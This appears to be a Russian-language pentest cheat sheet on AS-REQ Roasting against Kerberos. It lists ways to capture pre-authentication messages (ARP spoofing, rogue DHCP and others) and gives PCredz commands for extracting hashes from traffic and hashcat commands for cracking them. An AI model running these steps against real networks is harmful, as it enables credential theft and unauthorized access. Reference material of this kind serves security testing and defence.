# AS-REQ Roasting

### **Условие для проведения атаки**:

* Получение KRB\_AS\_REQ сообщения с включенной предварительной аутентификацией

### **Варианты выполнения условия**:

* Сообщение можно получить в результате атаки, направленной на перехват сетевого трафика (ARP spoofing, ICMP redirect, поддельный DHCP сервер, IPv6 spoofing).
* Сообщение можно извлечь из дампа сетевого трафика ([PCredz](https://github.com/lgandx/PCredz))

### **Команды для проведения атаки в Linux**:

Извлечение аутентификационных данных из pcap файла:

```sh
Pcredz -f $filepath
```

Извлечение аутентификационных данных из всех pcap файлов в папке:

```sh
Pcredz -d $dir_path
```

Извлечение аутентификационных данных при прослушивании сетевого интерфейса

```sh
Pcredz -i $interface_name -v
```

Hashcat:

Если штамп времени зашифрован с использованием RC4:

```sh
hashcat -m 7500 $AS_Req_rc4_hashes $dictionary
```

В случае AES256:

```sh
hashcat -m 19900 $AS_Req_AES256_hashes $dictionary
```
